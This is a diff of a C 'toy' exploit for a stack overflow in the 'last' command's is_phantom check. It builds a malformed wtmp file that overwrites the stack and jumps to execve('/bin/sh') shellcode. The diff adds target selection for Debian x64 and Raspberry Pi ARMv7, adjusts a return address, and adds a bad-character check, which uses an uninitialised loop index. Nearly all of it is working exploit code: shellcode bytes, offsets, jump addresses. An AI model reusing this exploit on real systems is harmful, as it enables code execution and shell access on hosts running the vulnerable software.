@@ -15,18 +15,7 @@ A toy exploit for the 'last' command is_phantom stack overflow vulnerability (la
 Generates a malformed wtmp file named mtmp (malformed-tmp)
 last needs to be compiled with flags "-O0 -fno-stack-protector"
 ASLR might be a thing too... basically, there is likely no practial use for this.
-
-is_phantom is called & performs an incorrectly bounds-checked snprintf call which allows the overwriting
-of stack variables and control flow values.
-
-Stack layout for x64 looks like
-
 */
-
-
-/*unsigned char shellcodes[2][] = {"\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78", // ARM execve("/bin/sh")
-  "\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05", //x64 execve("/bin/sh")
-  };*/
 
 struct Target {
   char *name;
@@ -51,8 +40,13 @@ struct Target target_rpi_armv7 = {
   .arch_size = 4,
   .sled = 0xe1a01001,
   .ip_offset = 0x3b,
-  .jmp = 0x7efff25b,
+  .jmp = 0x7efff448,
   .shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78", //armv7 thumb-mode execve("/bin/sh") (https://azeria-labs.com/writing-arm-shellcode/)
+};
+
+struct Target *targets[] = { 
+  &target_debian10_x64,
+  &target_rpi_armv7
 };
 
 int main(int argc, char **argv) {
@@ -64,14 +58,27 @@ int main(int argc, char **argv) {
   int sc_size;
   int ut_size;
   struct Target *target;
+ 
 #ifdef __arm__
-  fprintf(stderr, "Targeting ARM\n");
   target = &target_rpi_armv7;
 #elif
-  fprintf(stderr, "Targeting x64\n");
   target = &target_debian10_x64;
 #endif
-  
+
+  if (argc > 1 ) {
+    int target_index = atoi(argv[1]);
+    int target_count = sizeof(targets)/sizeof(struct Target *);
+    if (target_index >= 0 && target_index < target_count) {
+      target = targets[target_index];
+    } else {
+      fprintf(stderr, "Available targets:\n");
+      for (target_index = 0; target_index < target_count; target_index++) { 
+        fprintf(stderr, "\t%d - %s\n", target_index, targets[target_index]->name);
+      } 
+    }
+  }
+
+  fprintf(stderr, "%s\n", target->name);
   fprintf(stderr, "Phantom stack around: %p\n", &ut);
   sc_size = strlen(target->shellcode); // ignores the null
   ut_size = sizeof(struct utmpx); // ignore the null
@@ -95,6 +102,17 @@ int main(int argc, char **argv) {
   memcpy(&ut->ut_line[target->ip_offset], &target->jmp, target->arch_size);
 
   //Pre-flight checks
+  unsigned int bad_char_count = 0;
+  for(unsigned int sc_index; ut->ut_user[sc_index] != 0x00; sc_index++) {
+    if (ut->ut_user[sc_index] == 0x3a) {
+      bad_char_count++;
+    }
+  }
+  if (bad_char_count) {
+    fprintf(stderr, "Unexpected number of ':' characters detected in ut->ut_user. Found %d\n", bad_char_count);
+    return -1;
+  }
+
   pw = getpwnam(ut->ut_user);
   if (pw == NULL) {
     printf("%s:x:65535:65535::/tmp:/usr/sbin/nologin\n", ut->ut_user);
